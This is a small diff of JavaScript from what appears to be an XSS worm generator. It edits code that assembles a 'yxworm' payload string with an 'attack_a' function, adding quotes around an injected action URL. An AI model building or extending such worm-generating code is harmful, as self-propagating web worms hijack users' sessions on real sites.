@@ -164,7 +164,7 @@ codz.ajax = function(){
 	yxworm += "}\n\n";
 	
 	yxworm += "attack_a = function(){\n";
-	yxworm += "  var src = " + action + ";\n";
+	yxworm += "  var src = \"" + action + "\";\n";
 	var kvs = kv.split("&");
 	if(kv){
 		for(i=0; i<kvs.length; i++){
